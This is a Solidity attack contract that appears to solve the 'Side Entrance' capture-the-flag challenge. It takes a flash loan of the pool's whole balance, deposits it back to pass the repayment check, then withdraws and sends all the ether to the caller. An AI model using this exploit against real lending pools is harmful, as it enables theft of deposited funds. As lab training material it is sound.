pragma solidity ^0.8.0;

import '../side-entrance/SideEntranceLenderPool.sol';

contract SideEntranceAttack is IFlashLoanEtherReceiver {

    SideEntranceLenderPool pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function attack() public {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        msg.sender.call{value: address(this).balance}('');
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}

}
